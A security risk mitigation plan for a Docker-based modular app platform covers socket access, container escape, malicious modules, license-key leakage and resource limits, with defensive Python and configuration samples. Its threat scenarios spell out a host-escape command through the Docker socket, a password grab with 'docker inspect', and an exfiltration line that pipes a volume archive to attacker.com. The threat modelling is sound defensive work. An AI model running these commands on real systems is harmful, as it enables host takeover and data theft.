# Modular System - Security Risk Mitigation Plan

## Overview
This document outlines security risks associated with the modular app system implementation and comprehensive mitigation strategies following industry best practices.

**Last Updated:** 2025-10-17
**Version:** 1.0
**Security Level:** CRITICAL

---

## Table of Contents
- [Risk Assessment Summary](#risk-assessment-summary)
- [Critical Risks](#critical-risks)
- [High Risks](#high-risks)
- [Medium Risks](#medium-risks)
- [Mitigation Strategies](#mitigation-strategies)
- [Security Implementation Checklist](#security-implementation-checklist)
- [Incident Response Plan](#incident-response-plan)
- [Security Monitoring](#security-monitoring)

---

## Risk Assessment Summary

### Risk Categories

| Risk Level | Count | Examples |
|------------|-------|----------|
| CRITICAL | 2 | Docker Socket Access, Container Escape |
| HIGH | 4 | Malicious Modules, License Key Leakage, Resource Exhaustion, Network Access |
| MEDIUM | 5 | docker-compose.yml Corruption, Module Dependencies, Port Conflicts, Data Access, Privilege Escalation |
| LOW | 3 | License Validation Bypass, Module Metadata Tampering, Log Injection |

**Total Risks Identified:** 14

---

## Critical Risks

### RISK-C01: Docker Socket Access - Container Host Takeover

**Severity:** CRITICAL
**Likelihood:** HIGH
**Impact:** CATASTROPHIC

#### Description
Mounting `/var/run/docker.sock` to the API container grants full Docker control. A compromised API container or malicious actor with API access could:
- Spawn privileged containers
- Access host filesystem
- Kill or modify any container
- Read environment variables from all containers
- Escalate to host root access

#### Attack Scenarios

**Scenario 1: Direct Container Escape**
```bash
# Attacker gains shell access to API container
docker run -v /:/host -it ubuntu chroot /host /bin/bash
# Now has root access to Docker host
```

**Scenario 2: Read Secrets from Other Containers**
```bash
# Inspect other containers' environment variables
docker inspect a64core-mysql-dev | grep -i password
# Obtains database passwords
```

**Scenario 3: Data Exfiltration**
```bash
# Mount volume from another container
docker run -v mongodb_data:/data ubuntu tar czf - /data | curl -X POST attacker.com/upload
```

#### Mitigation Strategies

**1. Role-Based Access Control (MANDATORY)**

```python
# src/api/v1/modules.py
from ...middleware.permissions import require_role
from ...models.user import UserRole

@router.post("/install")
async def install_module(
    module_config: ModuleConfig,
    current_user: UserResponse = Depends(get_current_user)
):
    # CRITICAL: Only super_admin can install modules
    require_role([UserRole.SUPER_ADMIN], current_user)

    # Additional validation...
```

**Implementation:**
- ✅ Only `super_admin` role can install/uninstall modules
- ✅ Only `super_admin` and `admin` can view module status
- ✅ Regular users have NO access to module endpoints

---

**2. Audit Logging (MANDATORY)**

```python
# Log ALL module operations
async def log_module_operation(
    user_id: str,
    user_email: str,
    module_name: str,
    action: str,
    status: str,
    details: Optional[str] = None,
    ip_address: Optional[str] = None
):
    """
    Log module operations to MongoDB audit log.
    """
    log_entry = {
        "logId": str(uuid.uuid4()),
        "moduleId": module_id,
        "moduleName": module_name,
        "userId": user_id,
        "userEmail": user_email,
        "action": action,  # install, uninstall, start, stop, restart
        "status": status,  # success, failure
        "details": details,
        "timestamp": datetime.utcnow(),
        "ipAddress": ip_address,
        "userAgent": request.headers.get("User-Agent")
    }

    await db.module_audit_log.insert_one(log_entry)
    logger.critical(f"MODULE_OPERATION: {action} {module_name} by {user_email} - {status}")
```

**Implementation:**
- ✅ Log to MongoDB (`module_audit_log` collection)
- ✅ Log to file (`logs/module_operations.log`)
- ✅ Include: user, action, timestamp, IP, result
- ✅ Alert on ALL module operations
- ✅ Immutable audit trail (append-only)

---

**3. Docker Image Validation (MANDATORY)**

```python
async def validate_docker_image(image: str, module_name: str) -> Tuple[bool, Optional[str]]:
    """
    Validate Docker image before pulling.

    Security checks:
    1. Image from trusted registry
    2. Image signature verification
    3. Image scan for vulnerabilities
    4. Size limits
    """

    # 1. Whitelist trusted registries
    TRUSTED_REGISTRIES = [
        "registry.hub.docker.com",
        "ghcr.io",
        "gcr.io",
        "your-private-registry.com"
    ]

    image_registry = image.split('/')[0]
    if image_registry not in TRUSTED_REGISTRIES:
        return False, f"Untrusted registry: {image_registry}. Only {TRUSTED_REGISTRIES} allowed."

    # 2. Require image tags (no 'latest')
    if ':latest' in image or ':' not in image:
        return False, "Image tag required (no 'latest'). Use specific versions (e.g., myimage:1.0.0)"

    # 3. Image size limit (prevent pulling huge images)
    try:
        client = docker.from_env()
        # Pull image manifest (without downloading layers)
        distribution = client.api.inspect_distribution(image)
        size_mb = sum(layer['size'] for layer in distribution['layers']) / (1024 * 1024)

        MAX_IMAGE_SIZE_MB = 2048  # 2 GB limit
        if size_mb > MAX_IMAGE_SIZE_MB:
            return False, f"Image too large: {size_mb:.2f}MB (max: {MAX_IMAGE_SIZE_MB}MB)"

    except Exception as e:
        return False, f"Failed to validate image: {str(e)}"

    # 4. Image signature verification (if using Docker Content Trust)
    # TODO: Implement signature verification

    # 5. Vulnerability scanning (integration with Trivy, Clair, etc.)
    # TODO: Implement vulnerability scanning

    return True, None
```

**Implementation:**
- ✅ Whitelist trusted registries
- ✅ Require specific version tags (no `latest`)
- ✅ Image size limits (2GB max)
- ⚠️ TODO: Image signature verification
- ⚠️ TODO: Vulnerability scanning integration

---

**4. Container Sandboxing (MANDATORY)**

```python
def create_module_container_config(module_config: ModuleConfig) -> dict:
    """
    Create secure container configuration with sandboxing.
    """
    return {
        "image": module_config.image,
        "name": f"module-{module_config.moduleName}",
        "detach": True,
        "network": "a64core-network",

        # SECURITY: Resource limits
        "cpu_quota": int(float(module_config.cpuLimit) * 100000),  # CPU limit
        "mem_limit": module_config.memoryLimit,  # Memory limit
        "memswap_limit": module_config.memoryLimit,  # Disable swap

        # SECURITY: No privileged mode
        "privileged": False,

        # SECURITY: Read-only root filesystem (where possible)
        "read_only": True,

        # SECURITY: Drop all capabilities, add only needed ones
        "cap_drop": ["ALL"],
        "cap_add": [],  # Add specific capabilities if needed (e.g., NET_BIND_SERVICE)

        # SECURITY: No access to Docker socket
        "volumes": {
            # Only mount specific volumes, NEVER /var/run/docker.sock
        },

        # SECURITY: User namespace remapping (non-root user)
        "user": "1000:1000",  # Run as non-root

        # SECURITY: Security options
        "security_opt": [
            "no-new-privileges",  # Prevent privilege escalation
            "seccomp=unconfined",  # TODO: Use custom seccomp profile
        ],

        # SECURITY: PID limit (prevent fork bombs)
        "pids_limit": 100,

        # SECURITY: Restart policy
        "restart_policy": {"Name": "unless-stopped"},

        # Environment variables
        "environment": module_config.environment,

        # Port mappings
        "ports": _parse_port_mappings(module_config.ports),
    }
```

**Implementation:**
- ✅ CPU and memory limits
- ✅ No privileged containers
- ✅ Read-only root filesystem
- ✅ Drop all Linux capabilities
- ✅ Run as non-root user (UID 1000)
- ✅ No new privileges flag
- ✅ PID limits (prevent fork bombs)
- ⚠️ TODO: Custom seccomp profile

---

**5. Network Isolation (RECOMMENDED)**

```yaml
# Create isolated network for modules
docker network create \
  --driver bridge \
  --subnet 172.25.0.0/16 \
  --opt com.docker.network.bridge.enable_icc=false \
  a64core-modules-network
```

```python
# Modules communicate via NGINX proxy, not directly
"network_mode": "a64core-modules-network"  # Isolated network
```

**Implementation:**
- ✅ Separate Docker network for modules
- ✅ Inter-container communication disabled
- ✅ Modules only access API via NGINX
- ✅ Firewall rules between networks

---

**6. Regular Security Audits**

**Automated:**
- ✅ Daily: Check for containers running with privileged mode
- ✅ Daily: Verify no Docker socket mounts in module containers
- ✅ Weekly: Audit module container configurations
- ✅ Weekly: Review module operations audit log

**Manual:**
- ✅ Monthly: Security review of module operations
- ✅ Quarterly: Penetration testing of module system
- ✅ Annually: Third-party security audit

---

### RISK-C02: Container Escape & Host Compromise

**Severity:** CRITICAL
**Likelihood:** MEDIUM
**Impact:** CATASTROPHIC

#### Description
If a module container is compromised, attacker could escape to Docker host using kernel exploits, Docker vulnerabilities, or misconfigurations.

#### Attack Scenarios

**Scenario 1: Kernel Exploit**
```bash
# Exploit CVE-XXXX-YYYY to escape container
# Gain root on Docker host
```

**Scenario 2: Docker Daemon Exploit**
```bash
# Exploit Docker daemon vulnerability
# Access /var/run/docker.sock from inside container
```

#### Mitigation Strategies

**1. Keep Systems Updated (MANDATORY)**

```bash
# Regular updates
apt-get update && apt-get upgrade -y  # Ubuntu/Debian
yum update -y  # CentOS/RHEL

# Docker updates
apt-get install docker-ce docker-ce-cli containerd.io
```

**Schedule:**
- ✅ Weekly: Security patch review
- ✅ Monthly: Docker and system updates
- ✅ Immediate: Critical CVE patches

---

**2. AppArmor/SELinux Profiles (RECOMMENDED)**

```yaml
# docker-compose.yml for modules
security_opt:
  - apparmor=docker-default  # Use AppArmor profile
  # or
  - label=type:container_runtime_t  # SELinux
```

**Implementation:**
- ✅ Enable AppArmor (Ubuntu/Debian) or SELinux (CentOS/RHEL)
- ✅ Use default Docker profiles
- ⚠️ TODO: Custom profiles for stricter enforcement

---

**3. Seccomp Profiles (RECOMMENDED)**

```json
// custom-seccomp-profile.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "accept", "bind", "clone", "close", "connect",
        "dup", "dup2", "execve", "exit", "fork",
        "read", "write", "open", "stat", "fstat"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```python
"security_opt": [
    "seccomp=/path/to/custom-seccomp-profile.json"
]
```

**Implementation:**
- ⚠️ TODO: Create custom seccomp profile
- ⚠️ TODO: Test with common modules
- ⚠️ TODO: Document required syscalls

---

**4. Runtime Security Monitoring (RECOMMENDED)**

Tools:
- **Falco** - Runtime security monitoring
- **Sysdig** - Container visibility and security
- **Aqua Security** - Container security platform

```bash
# Install Falco
docker run -it --rm \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  falcosecurity/falco
```

**Alerts:**
- ✅ Container spawning shell
- ✅ Sensitive file access (/etc/shadow, /root/.ssh)
- ✅ Network connections to suspicious IPs
- ✅ Privilege escalation attempts

**Implementation:**
- ⚠️ TODO: Install Falco or similar
- ⚠️ TODO: Configure alerting
- ⚠️ TODO: Integrate with logging system

---

## High Risks

### RISK-H01: Malicious Module Installation

**Severity:** HIGH
**Likelihood:** MEDIUM
**Impact:** HIGH

#### Description
Attacker with super_admin access or compromised credentials installs malicious module containing:
- Backdoors
- Cryptominers
- Data exfiltration tools
- Ransomware

#### Mitigation Strategies

**1. Multi-Factor Authentication for Super Admin (MANDATORY)**

```python
# TODO: Implement MFA for super_admin role
# Phase: v1.6.0+
```

**Implementation:**
- ⚠️ TODO: MFA for super_admin accounts
- ⚠️ TODO: TOTP (Time-based One-Time Password)
- ⚠️ TODO: Backup codes

---

**2. Module Approval Workflow (RECOMMENDED)**

```python
class ModuleApprovalStatus(str, Enum):
    PENDING_APPROVAL = "pending_approval"
    APPROVED = "approved"
    REJECTED = "rejected"

# Installation requires approval from 2 super_admins
async def install_module(module_config: ModuleConfig, current_user: UserResponse):
    # 1. Create pending approval request
    approval_request = {
        "requestId": str(uuid.uuid4()),
        "moduleName": module_config.moduleName,
        "requestedBy": current_user.userId,
        "status": ModuleApprovalStatus.PENDING_APPROVAL,
        "approvals": [],
        "createdAt": datetime.utcnow()
    }

    await db.module_approval_requests.insert_one(approval_request)

    # 2. Notify other super_admins
    # 3. Wait for approval from at least 1 other super_admin
    # 4. Then install module
```

**Implementation:**
- ⚠️ TODO: Approval workflow
- ⚠️ TODO: Email notifications
- ⚠️ TODO: Approval UI

---

**3. Image Scanning (RECOMMENDED)**

```python
async def scan_image_for_vulnerabilities(image: str) -> Tuple[bool, List[dict]]:
    """
    Scan Docker image for vulnerabilities using Trivy.
    """
    import subprocess

    try:
        # Run Trivy scan
        result = subprocess.run(
            ["trivy", "image", "--format", "json", image],
            capture_output=True,
            text=True,
            timeout=120
        )

        vulnerabilities = json.loads(result.stdout)

        # Check for CRITICAL or HIGH vulnerabilities
        critical_vulns = [
            v for v in vulnerabilities.get("Results", [])
            if v.get("Severity") in ["CRITICAL", "HIGH"]
        ]

        if critical_vulns:
            return False, critical_vulns

        return True, []

    except Exception as e:
        logger.error(f"Image scanning failed: {e}")
        # Fail securely: reject if scanning fails
        return False, [{"error": str(e)}]
```

**Implementation:**
- ⚠️ TODO: Install Trivy
- ⚠️ TODO: Integrate with install workflow
- ⚠️ TODO: Block installation if CRITICAL/HIGH vulns found

---

**4. Code Signing & Verification (RECOMMENDED)**

```python
# Verify module image signatures using Docker Content Trust
os.environ["DOCKER_CONTENT_TRUST"] = "1"

# Only pull signed images
docker_client.images.pull(image, platform="linux/amd64")
```

**Implementation:**
- ⚠️ TODO: Enable Docker Content Trust
- ⚠️ TODO: Require signed images
- ⚠️ TODO: Maintain signing keys

---

### RISK-H02: License Key Leakage

**Severity:** HIGH
**Likelihood:** MEDIUM
**Impact:** MEDIUM

#### Description
License keys stored in database or environment variables could be exposed through:
- Database dumps
- Log files
- Error messages
- API responses
- docker-compose.yml in version control

#### Mitigation Strategies

**1. Encrypt License Keys in Database (MANDATORY)**

```python
from src.utils.encryption import encrypt_license_key, decrypt_license_key

# Store encrypted
encrypted_key = encrypt_license_key(module_config.licenseKey)
await db.installed_modules.insert_one({
    "licenseKeyEncrypted": encrypted_key,
    # Never store plain text
})

# Retrieve and decrypt when needed
module_doc = await db.installed_modules.find_one({"moduleName": module_name})
plain_license = decrypt_license_key(module_doc["licenseKeyEncrypted"])
```

**Implementation:**
- ✅ Encrypt before storage (Fernet symmetric encryption)
- ✅ Derive encryption key from SECRET_KEY (PBKDF2)
- ✅ Never log license keys
- ✅ Never return in API responses

---

**2. Environment Variable Protection (MANDATORY)**

```python
# NEVER log environment variables
# BAD:
logger.info(f"Container env: {environment}")  # ❌

# GOOD:
logger.info(f"Container created with {len(environment)} env vars")  # ✅

# Redact license keys in logs
def redact_sensitive_data(data: dict) -> dict:
    """Redact license keys and passwords from data"""
    redacted = data.copy()
    for key in ["LICENSE_KEY", "PASSWORD", "SECRET", "TOKEN"]:
        if key in redacted:
            redacted[key] = "***REDACTED***"
    return redacted
```

**Implementation:**
- ✅ Never log full environment variables
- ✅ Redact sensitive values in logs
- ✅ Use `***REDACTED***` placeholder

---

**3. Secrets Management (RECOMMENDED)**

```python
# Use Docker secrets (Swarm) or Kubernetes secrets
docker service create \
  --name module-analytics \
  --secret license_key \
  analytics:1.0.0
```

**Implementation:**
- ⚠️ TODO: Migrate to Docker secrets
- ⚠️ TODO: Use external secret manager (Vault, AWS Secrets Manager)
- ⚠️ TODO: Rotate license keys regularly

---

**4. Access Control for License Keys (MANDATORY)**

```python
@router.get("/modules/{module_name}")
async def get_module_status(module_name: str, current_user: UserResponse):
    module = await db.installed_modules.find_one({"moduleName": module_name})

    # NEVER return license key in response
    response = ModuleResponse(**module)
    # ModuleResponse does not include licenseKeyEncrypted field

    return response
```

**Implementation:**
- ✅ License keys NEVER in API responses
- ✅ Pydantic models exclude sensitive fields
- ✅ Database queries project only needed fields

---

### RISK-H03: Resource Exhaustion (DoS)

**Severity:** HIGH
**Likelihood:** HIGH
**Impact:** MEDIUM

#### Description
Malicious or poorly configured modules consume excessive resources:
- CPU (cryptomining)
- Memory (memory leaks)
- Disk space (log flooding)
- Network bandwidth (DDoS participation)
- File descriptors (connection exhaustion)

#### Mitigation Strategies

**1. Enforce Resource Limits (MANDATORY)**

```python
# CPU limit
"cpu_quota": int(float(module_config.cpuLimit) * 100000),
"cpu_period": 100000,

# Memory limit
"mem_limit": module_config.memoryLimit,  # e.g., "512m"
"memswap_limit": module_config.memoryLimit,  # No swap

# PID limit (prevent fork bombs)
"pids_limit": 100,

# Disk I/O limits
"blkio_weight": 500,  # 10-1000, default 500

# Network bandwidth (requires tc setup on host)
# TODO: Implement network rate limiting
```

**Defaults:**
- CPU: 1.0 (1 core max)
- Memory: 512MB
- PIDs: 100 processes
- Disk I/O: 50% weight

**Implementation:**
- ✅ Mandatory CPU limits
- ✅ Mandatory memory limits
- ✅ PID limits
- ⚠️ TODO: Network bandwidth limits
- ⚠️ TODO: Disk I/O rate limits

---

**2. Resource Monitoring & Alerts (MANDATORY)**

```python
async def monitor_module_resources(module_name: str):
    """
    Monitor module resource usage and alert if thresholds exceeded.
    """
    client = docker.from_env()
    container = client.containers.get(f"module-{module_name}")

    # Get stats
    stats = container.stats(stream=False)

    # CPU usage
    cpu_delta = stats['cpu_stats']['cpu_usage']['total_usage'] - \
                stats['precpu_stats']['cpu_usage']['total_usage']
    system_delta = stats['cpu_stats']['system_cpu_usage'] - \
                   stats['precpu_stats']['system_cpu_usage']
    cpu_percent = (cpu_delta / system_delta) * len(stats['cpu_stats']['cpu_usage']['percpu_usage']) * 100.0

    # Memory usage
    memory_usage = stats['memory_stats']['usage']
    memory_limit = stats['memory_stats']['limit']
    memory_percent = (memory_usage / memory_limit) * 100.0

    # Alert if thresholds exceeded
    if cpu_percent > 90:
        logger.critical(f"MODULE_ALERT: {module_name} CPU usage {cpu_percent:.2f}% (threshold: 90%)")
        # Send alert

    if memory_percent > 90:
        logger.critical(f"MODULE_ALERT: {module_name} Memory usage {memory_percent:.2f}% (threshold: 90%)")
        # Send alert
```

**Thresholds:**
- CPU: 90% of limit → WARNING
- Memory: 90% of limit → WARNING
- Disk: 80% full → WARNING
- Network: 80% of bandwidth → WARNING

**Implementation:**
- ✅ Monitor every 60 seconds
- ✅ Alert on threshold breach
- ✅ Auto-stop if sustained high usage (95%+ for 5 minutes)

---

**3. Module Quotas (RECOMMENDED)**

```python
# Limit number of modules per user/organization
MAX_MODULES_PER_USER = 10
MAX_TOTAL_MODULES = 50

# Check before installation
user_modules = await db.installed_modules.count_documents({"installedBy": user_id})
if user_modules >= MAX_MODULES_PER_USER:
    raise HTTPException(403, f"User module limit reached ({MAX_MODULES_PER_USER})")

total_modules = await db.installed_modules.count_documents({})
if total_modules >= MAX_TOTAL_MODULES:
    raise HTTPException(503, f"Platform module limit reached ({MAX_TOTAL_MODULES})")
```

**Implementation:**
- ✅ Per-user module limits
- ✅ Platform-wide module limits
- ✅ Configurable via environment variables

---

### RISK-H04: Unrestricted Network Access

**Severity:** HIGH
**Likelihood:** HIGH
**Impact:** MEDIUM

#### Description
Module containers have unrestricted network access, allowing:
- Outbound connections to malicious servers
- Data exfiltration
- C&C (Command & Control) communication
- Participation in DDoS attacks
- Access to internal services (MongoDB, MySQL)

#### Mitigation Strategies

**1. Network Policies (RECOMMENDED)**

```bash
# Create restricted network with no internet access
docker network create \
  --driver bridge \
  --internal \
  a64core-modules-internal

# Modules on internal network can only access API
# Whitelist external access per module
```

**Implementation:**
- ✅ Internal network (no internet by default)
- ✅ Whitelist external domains per module
- ⚠️ TODO: Firewall rules (iptables)
- ⚠️ TODO: DNS filtering

---

**2. Database Access Restrictions (MANDATORY)**

```yaml
# MongoDB - restrict to API container only
mongodb:
  networks:
    a64core-backend:  # Separate network
      ipv4_address: 172.20.0.2

api:
  networks:
    a64core-backend:
    a64core-modules:  # Can communicate with modules

# Modules CANNOT directly access MongoDB
```

**Implementation:**
- ✅ Databases on separate network
- ✅ Only API container accesses databases
- ✅ Modules access data via API endpoints only

---

**3. Egress Filtering (RECOMMENDED)**

```python
# Whitelist allowed external domains per module
ALLOWED_EGRESS_DOMAINS = {
    "analytics": [
        "api.analytics.com",
        "cdn.analytics.com"
    ]
}

# TODO: Implement DNS proxy with whitelist
# TODO: Block all other external access
```

**Implementation:**
- ⚠️ TODO: DNS proxy (e.g., dnsmasq)
- ⚠️ TODO: Whitelist external domains
- ⚠️ TODO: Block non-whitelisted domains

---

**4. Traffic Monitoring (RECOMMENDED)**

```bash
# Log all outbound connections
# Use Falco, Sysdig, or custom monitoring
```

**Alerts:**
- ✅ Connection to non-whitelisted domain
- ✅ High outbound traffic volume
- ✅ Connections to suspicious IPs (malware, C&C servers)

**Implementation:**
- ⚠️ TODO: Network traffic monitoring
- ⚠️ TODO: Integrate with threat intelligence feeds
- ⚠️ TODO: Auto-block suspicious connections

---

## Medium Risks

### RISK-M01: docker-compose.yml Corruption

**Severity:** MEDIUM
**Likelihood:** MEDIUM
**Impact:** HIGH

#### Description
Dynamic modification of docker-compose.yml could corrupt the file, preventing all services from starting.

#### Mitigation Strategies

**1. Backup Before Modification (MANDATORY)**

```python
async def backup_docker_compose():
    """Create timestamped backup of docker-compose.yml"""
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    backup_path = f"config/docker-compose.yml.backup.{timestamp}"

    shutil.copy("docker-compose.yml", backup_path)
    logger.info(f"docker-compose.yml backed up to {backup_path}")

    # Keep only last 10 backups
    backups = sorted(glob.glob("config/docker-compose.yml.backup.*"))
    if len(backups) > 10:
        for old_backup in backups[:-10]:
            os.remove(old_backup)
```

**Implementation:**
- ✅ Backup before every modification
- ✅ Keep 10 most recent backups
- ✅ Automated cleanup of old backups

---

**2. Validation After Modification (MANDATORY)**

```python
async def validate_docker_compose():
    """Validate docker-compose.yml syntax"""
    try:
        # Parse YAML
        with open("docker-compose.yml", "r") as f:
            compose_config = yaml.safe_load(f)

        # Validate structure
        required_keys = ["version", "services", "networks", "volumes"]
        for key in required_keys:
            if key not in compose_config:
                raise ValueError(f"Missing required key: {key}")

        # Validate with docker-compose command
        result = subprocess.run(
            ["docker-compose", "config"],
            capture_output=True,
            text=True,
            timeout=30
        )

        if result.returncode != 0:
            raise ValueError(f"docker-compose validation failed: {result.stderr}")

        return True

    except Exception as e:
        logger.error(f"docker-compose.yml validation failed: {e}")
        return False
```

**Implementation:**
- ✅ YAML syntax validation
- ✅ Required keys validation
- ✅ docker-compose config validation
- ✅ Rollback if validation fails

---

**3. Rollback Mechanism (MANDATORY)**

```python
async def rollback_docker_compose():
    """Restore docker-compose.yml from most recent backup"""
    backups = sorted(glob.glob("config/docker-compose.yml.backup.*"), reverse=True)
    if not backups:
        raise FileNotFoundError("No backups found")

    latest_backup = backups[0]
    shutil.copy(latest_backup, "docker-compose.yml")
    logger.info(f"Rolled back docker-compose.yml from {latest_backup}")
```

**Implementation:**
- ✅ Automatic rollback on validation failure
- ✅ Manual rollback command
- ✅ Test rollback during deployment

---

### RISK-M02: Module Dependency Conflicts

**Severity:** MEDIUM
**Likelihood:** MEDIUM
**Impact:** MEDIUM

#### Description
Modules with conflicting dependencies:
- Port conflicts (two modules want port 8001)
- Service conflicts (two modules depend on same Redis instance)
- Version conflicts (Module A needs Python 3.8, Module B needs Python 3.11)

#### Mitigation Strategies

**1. Dependency Resolution (RECOMMENDED)**

```python
async def check_module_dependencies(
    module_config: ModuleConfig,
    existing_modules: List[ModuleInDB]
) -> Tuple[bool, Optional[str]]:
    """
    Check if module dependencies are satisfied and no conflicts exist.
    """

    # 1. Check port conflicts
    requested_ports = set(p.split(':')[0] for p in module_config.ports)
    used_ports = set()
    for module in existing_modules:
        used_ports.update(p.split(':')[0] for p in module.ports)

    port_conflicts = requested_ports & used_ports
    if port_conflicts:
        return False, f"Port conflict: {port_conflicts} already in use"

    # 2. Check dependency modules exist
    for dep in module_config.dependencies:
        dep_module = next((m for m in existing_modules if m.moduleName == dep), None)
        if not dep_module:
            return False, f"Dependency not found: {dep}"
        if dep_module.status != ModuleStatus.RUNNING:
            return False, f"Dependency not running: {dep}"

    # 3. Check circular dependencies
    # TODO: Implement graph-based cycle detection

    return True, None
```

**Implementation:**
- ✅ Port conflict detection
- ✅ Dependency existence check
- ⚠️ TODO: Circular dependency detection
- ⚠️ TODO: Version compatibility matrix

---

**2. Auto Port Assignment (RECOMMENDED)**

```python
async def assign_available_port(start_port: int = 8001, end_port: int = 8999):
    """Find next available port in range"""
    used_ports = set()
    async for module in db.installed_modules.find({}):
        used_ports.update(int(p.split(':')[0]) for p in module['ports'])

    for port in range(start_port, end_port + 1):
        if port not in used_ports:
            return port

    raise HTTPException(503, "No available ports")
```

**Implementation:**
- ✅ Auto-assign ports if not specified
- ✅ Port range: 8001-8999 for modules
- ✅ Track port usage in database

---

## Security Implementation Checklist

### Phase 1: Infrastructure Security

- [x] Docker socket access restricted to API container only
- [ ] Redis password authentication enabled
- [ ] NGINX SSL/TLS configured (production)
- [ ] NGINX security headers configured
- [x] Audit logging for all module operations
- [x] Environment variables for secrets (no hardcoding)

### Phase 2: Module Manager Security

- [ ] License key encryption implemented
- [ ] License validation system implemented
- [ ] Docker image validation (trusted registries)
- [ ] Image tag enforcement (no 'latest')
- [ ] Image size limits
- [ ] Container resource limits (CPU, memory, PIDs)
- [ ] Container capabilities dropped (cap_drop: ALL)
- [ ] Read-only root filesystem
- [ ] Non-root user enforcement
- [ ] No privileged containers

### Phase 3: API Security

- [ ] super_admin RBAC for all module endpoints
- [ ] Audit logging for all module API calls
- [ ] Input validation (Pydantic models)
- [ ] Rate limiting on module endpoints
- [ ] No sensitive data in API responses (license keys)

### Phase 4: Monitoring & Alerting

- [ ] Resource usage monitoring (CPU, memory, disk, network)
- [ ] Threshold alerts (90% resource usage)
- [ ] Security event logging
- [ ] Failed installation attempts logged
- [ ] Suspicious module behavior alerts

### Phase 5: Advanced Security (Future)

- [ ] Multi-factor authentication for super_admin
- [ ] Module approval workflow (2-person rule)
- [ ] Image vulnerability scanning (Trivy)
- [ ] Image signature verification (Docker Content Trust)
- [ ] Runtime security monitoring (Falco)
- [ ] Network egress filtering
- [ ] Custom seccomp profiles
- [ ] AppArmor/SELinux profiles

---

## Incident Response Plan

### Module Security Incident

**Scenario:** Suspicious module detected (high CPU, suspicious network activity)

**Response Steps:**

1. **DETECT** (Automated)
   - Monitoring system alerts on high resource usage
   - Network monitoring detects connection to suspicious IP

2. **RESPOND** (Immediate - Automated)
   ```python
   async def emergency_stop_module(module_name: str, reason: str):
       """Emergency stop of suspicious module"""
       logger.critical(f"SECURITY_INCIDENT: Stopping module {module_name} - {reason}")

       # Stop container immediately
       client = docker.from_env()
       container = client.containers.get(f"module-{module_name}")
       container.stop(timeout=10)

       # Update database
       await db.installed_modules.update_one(
           {"moduleName": module_name},
           {"$set": {"status": "stopped", "errorMessage": f"Security incident: {reason}"}}
       )

       # Log incident
       await log_security_incident(module_name, reason)

       # Alert super_admins
       await alert_super_admins(f"Module {module_name} stopped due to security incident: {reason}")
   ```

3. **INVESTIGATE** (Manual - Within 1 hour)
   - Review module audit logs
   - Review module container logs
   - Review network traffic logs
   - Review resource usage history

4. **CONTAIN** (Manual - Within 2 hours)
   - Isolate affected module (network disconnect)
   - Preserve evidence (logs, container state)
   - Assess impact (what data was accessed?)

5. **ERADICATE** (Manual - Within 4 hours)
   - Uninstall malicious module
   - Review other modules from same source
   - Update firewall rules
   - Patch vulnerabilities

6. **RECOVER** (Manual - Within 8 hours)
   - Restore from backup if needed
   - Verify system integrity
   - Resume normal operations

7. **POST-INCIDENT** (Within 1 week)
   - Document incident
   - Update security procedures
   - Train team on lessons learned

---

## Security Monitoring

### Metrics to Monitor

**Module Operations:**
- Module installations per day
- Module uninstalls per day
- Failed installation attempts
- Installation by user

**Resource Usage:**
- CPU usage per module (average, peak)
- Memory usage per module (average, peak)
- Disk usage per module
- Network traffic per module

**Security Events:**
- Failed authentication attempts
- Privilege escalation attempts
- Docker socket access attempts
- Suspicious network connections
- License validation failures

**System Health:**
- Container uptime
- Container restarts
- Docker daemon errors
- Database connection errors

### Alerting Thresholds

| Metric | Warning | Critical | Action |
|--------|---------|----------|--------|
| CPU Usage | 80% | 90% | Auto-stop at 95% for 5min |
| Memory Usage | 80% | 90% | Auto-stop at 95% for 5min |
| Failed Installations | 3/hour | 5/hour | Alert super_admins |
| Failed Auth | 5/hour | 10/hour | Lock account |
| Module Restarts | 3/hour | 5/hour | Investigate, possible stop |

---

## Security Testing

### Pre-Release Security Tests

1. **Penetration Testing**
   - [ ] Test Docker socket access restrictions
   - [ ] Test RBAC enforcement
   - [ ] Test license key encryption
   - [ ] Test container escape attempts
   - [ ] Test resource limit enforcement

2. **Vulnerability Scanning**
   - [ ] Scan API container for vulnerabilities
   - [ ] Scan dependencies for CVEs
   - [ ] Scan Docker daemon version

3. **Security Audits**
   - [ ] Code review for security issues
   - [ ] Configuration review
   - [ ] Access control review
   - [ ] Audit logging review

---

**END OF SECURITY RISK MITIGATION PLAN**

---

## Document Maintenance

**Update Frequency:** After every security incident or major change
**Responsible:** Security Team / DevOps Lead
**Review Date:** Quarterly

**Last Reviewed:** 2025-10-17
**Next Review:** 2026-01-17